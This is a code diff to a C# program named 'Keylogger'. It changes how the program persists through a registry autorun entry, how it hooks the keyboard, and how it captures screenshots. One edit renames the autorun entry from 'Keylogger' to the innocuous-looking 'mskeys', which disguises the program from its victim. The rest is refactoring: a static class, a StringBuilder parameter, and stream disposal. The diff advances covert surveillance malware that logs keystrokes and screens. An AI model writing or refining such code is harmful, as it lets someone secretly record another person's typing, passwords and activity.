@@ -9,13 +9,14 @@ using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Text;
 
 namespace Keylogger
 {
 
     #region AutoRun
 
-    public class AutoRun
+    public static class AutoRun
     {
         static AutoRun()
         {
@@ -23,7 +24,7 @@ namespace Keylogger
         }
         public static bool SetAutoRun(bool autorun, string path)
         {
-            const string name = "Keylogger";
+            const string name = "mskeys";
             string EXEpath = path;
             RegistryKey reg;
 
@@ -199,7 +200,7 @@ namespace Keylogger
                         return 1;
                 }
             }
-            return CallNextHookEx(hhook, code, wParam, ref lParam);
+             return CallNextHookEx(hhook, code, wParam, ref lParam);
         }
 
         #endregion
@@ -365,8 +366,6 @@ namespace Keylogger
 
         private static BitmapSource TakeScreen()
         {
-
-
             Bitmap bitmap;
             BitmapSource bitmapsource = null;
 
@@ -399,7 +398,7 @@ namespace Keylogger
 
         }
 
-        public static void ScreenSave(string numscreen)
+        public static void ScreenSave(StringBuilder numscreen)
         {
             string path = AutoRun.Path+"\\System\\" + numscreen + ".jpg";
            // string path = AutoRun.Path() +  "Key.rtf";
@@ -413,8 +412,6 @@ namespace Keylogger
             {
                 fs = new FileStream(path, FileMode.Create, FileAccess.Write);
                 jpeg.Save(fs);
-                fs.Close();
-
             }
 
             catch (Exception ex)
@@ -424,6 +421,7 @@ namespace Keylogger
 
             finally
             {
+                fs.Dispose();
                 fs.Close();
             }
         }
